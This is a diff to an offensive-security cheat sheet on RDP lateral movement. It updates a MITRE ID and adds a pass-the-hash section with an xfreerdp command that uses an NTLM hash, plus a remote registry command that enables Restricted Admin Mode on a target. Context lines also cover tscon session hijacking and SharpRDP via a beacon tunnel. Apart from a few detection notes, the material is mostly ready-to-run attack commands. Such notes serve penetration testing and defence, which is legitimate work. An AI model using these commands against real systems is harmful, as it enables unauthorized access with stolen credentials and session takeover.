@@ -1,6 +1,6 @@
 # RDP Lateral Movement
 
-## RDP Hijacking with tscon (T1076)
+## RDP Hijacking with tscon (T1021.001)
 - Requires SYSTEM privileges; no password needed
 ```cmd
 # Elevate to SYSTEM
@@ -24,7 +24,19 @@ SharpRDP.exe computername=TARGET command=calc username=DOMAIN\admin password=pas
 - Use socks proxy + rdesktop/xfreerdp through beacon tunnel
 - Or use SharpRDP through execute-assembly
 
+## Pass-the-Hash RDP
+```bash
+# xfreerdp with NTLM hash (Restricted Admin Mode must be enabled on target)
+xfreerdp /v:TARGET /u:admin /pth:NTLM_HASH /d:DOMAIN
+
+# Enable Restricted Admin Mode remotely (requires admin access)
+reg add "\\TARGET\HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
+```
+- Restricted Admin Mode allows pass-the-hash without knowing the plaintext password
+- `mstsc /restrictedadmin` from Windows GUI also uses this mode
+
 ## Notes
 - RDP creates detailed logon event trails (4624 type 10)
 - NLA (Network Level Authentication) adds pre-auth barrier
 - RDP hijacking bypasses NLA since session already authenticated
+- Pass-the-hash RDP requires Restricted Admin Mode enabled on the target
